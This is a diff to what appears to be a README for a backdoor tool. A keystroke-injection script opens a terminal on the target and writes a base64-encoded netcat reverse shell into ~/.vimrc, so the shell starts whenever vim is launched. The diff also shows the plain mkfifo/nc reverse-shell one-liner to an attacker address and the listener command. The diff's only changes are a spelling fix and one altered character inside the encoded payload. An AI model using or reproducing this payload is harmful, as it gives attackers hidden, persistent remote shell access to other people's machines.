@@ -12,7 +12,7 @@ A simple backdoor that execute a base64 encoded netcat reverse shell embedd into
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 ```
-5. Start a netcat listener in you'r attacker box.
+5. Start a netcat listener in your attacker box.
 ```bash
 nc -nvlp 1234
 ```
@@ -26,7 +26,7 @@ layout("CH")
 typingSpeed(1, 2)
 press("CTRL ALT T")
 delay(1000)
-type("echo '!base64 -d <<< cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjEwMyAxMjM0ID4vdG1wL2Y= | sh' > ~/.vimrc")
+type("echo '!base64 -d <<< cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1prIDI+JjF8bmMgMTkyLjE2OC4xLjEwMyAxMjM0ID4vdG1wL2Y= | sh' > ~/.vimrc")
 press("ENTER")
 delay(1000)
 type("exit")
